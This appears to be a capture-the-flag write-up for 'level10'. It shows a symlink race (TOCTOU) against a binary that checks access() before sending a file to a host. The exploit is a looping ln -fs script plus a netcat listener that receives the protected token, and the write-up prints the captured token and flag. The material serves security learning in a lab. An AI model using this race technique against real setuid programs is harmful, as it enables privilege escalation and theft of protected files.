# First step

Some files as level08.  
```shell
$> ./level10
./level10 file host
        sends file to host if you have access to it

$> ./level10 token 0.0.0.0
You don't have access to token  
```

With Ghidra.

```c
[...]
[...] = access(argv[1], 4); 
[...]

// We need create some fake linked file. 
// because the executable check if file have access, if yes, it will continue
```

We also need a server to listen on port 6969.  
Becuase:

```shell
$> touch /tmp/test

$> ./level10 /tmp/test 0.0.0.0  
Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
```

# Second step


I create a script to switch the linked file with the '/tmp/fake_ln' and '~/token'.

```shell
# fake_ln.sh
touch /tmp/something

while true;
do
    ln -fs /tmp/something /tmp/fake_ln;
    ln -fs ~/token /tmp/fake_ln;
done
```

```shell
$> scp -P 4242 ./fake_ln.sh scp://level10@192.168.64.2/../../../tmp/fake_ln.sh
```

I run a listen server with Netcat and launch the script in the same time.

```shell
# Terminal 1
# (-l: listen mode)
# (-k: force stay connected)
$> nc -l -k 6969
# Get with terminal3
.*( )*.  
.*( )*.  
.*( )*.  
woupa2yuojeeaaed06riuj63c  


# Terminal 2
$> /tmp/fake_ln.sh


# Terminal 3
$> ./level10 /tmp/fake_ln 0.0.0.0
You don't have access to /tmp/fake_ln

$> ./level10 /tmp/fake_ln 0.0.0.0
You don't have access to /tmp/fake_ln

[...]

$> ./level10 /tmp/fake_ln 0.0.0.0
Connecting to 0.0.0.0:6969 .. Connected!
Sending file .. wrote file!

$> su flag10
Don't forget to launch getflag !

$> getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```